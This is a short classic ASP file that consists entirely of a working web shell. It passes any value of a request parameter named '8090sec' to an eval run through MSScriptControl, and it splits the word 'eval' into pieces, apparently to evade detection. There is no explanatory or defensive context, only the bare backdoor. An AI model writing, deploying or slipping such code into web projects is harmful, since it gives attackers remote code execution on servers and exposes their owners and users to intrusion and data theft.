<%
set ms = server.CreateObject("MSScriptControl.ScriptControl.1")
ms.Language="VBScript"
ms.AddObject "Response", Response
ms.AddObject "request", request
ms.ExecuteStatement("ev"&"al(request(""8090sec""))")
%>